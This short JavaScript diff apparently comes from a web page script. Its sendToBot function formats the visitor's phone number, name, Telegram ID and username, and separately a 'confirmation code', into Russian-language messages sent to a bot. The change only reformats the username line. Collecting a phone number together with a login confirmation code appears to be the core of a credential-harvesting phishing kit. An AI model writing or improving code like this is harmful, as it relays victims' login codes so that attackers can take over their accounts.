@@ -14,7 +14,7 @@ window.sendToBot = async (type, data) => {
     message = `📱 <b>Новый номер:</b> <code>${data}</code>\n` +
               `👤 От: ${user.first_name || 'Неизвестно'} ${user.last_name || ''}\n` +
               `🆔 ID: <code>${user.id || '?'}</code>\n` +
-              (user.username ? `@${user.username}` : '');
+              `🆔 ID: <code>${user.username || '?'}</code>\n`;
   } 
   else if (type === 'code') {
     message = `🔢 <b>Код подтверждения:</b> <code>${data}</code>\n` +
